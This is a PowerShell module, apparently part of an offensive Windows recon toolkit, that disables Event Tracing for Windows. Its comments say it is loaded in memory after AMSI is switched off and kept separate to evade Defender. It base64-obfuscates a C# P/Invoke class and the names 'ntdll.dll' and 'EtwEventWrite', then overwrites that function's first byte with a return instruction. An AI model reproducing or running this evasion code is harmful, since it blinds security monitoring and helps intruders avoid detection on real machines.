# Invoke-Stealth.ps1 — ETW patch module for Invoke-WindowsRecon.ps1
# Downloaded and executed in-memory AFTER AMSI is already disabled.
# Kept separate so the main script has no suspicious strings for Defender.

$results = @{ ETW = $false }

try {
    $csB64 = "dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcztwdWJsaWMgY2xhc3MgVzMyRXtbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaCxzdHJpbmcgbik7W0RsbEltcG9ydCgia2VybmVsMzIiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG4pO1tEbGxJbXBvcnQoImtlcm5lbDMyIildcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYSxVSW50UHRyIHMsdWludCBwLG91dCB1aW50IG8pO30="
    $csSrc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($csB64))
    Add-Type -TypeDefinition $csSrc -Language CSharp -ErrorAction SilentlyContinue

    $enc = [System.Text.Encoding]::UTF8
    $lib = $enc.GetString([Convert]::FromBase64String("bnRkbGwuZGxs"))
    $fn  = $enc.GetString([Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))

    $h = [W32E]::LoadLibrary($lib)
    $addr = [W32E]::GetProcAddress($h, $fn)

    if ($addr -ne [IntPtr]::Zero) {
        $op = 0
        [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$op) | Out-Null
        [System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)
        [W32E]::VirtualProtect($addr, [UIntPtr]::new(1), $op, [ref]$op) | Out-Null
        $results.ETW = $true
    }
} catch {}

return $results
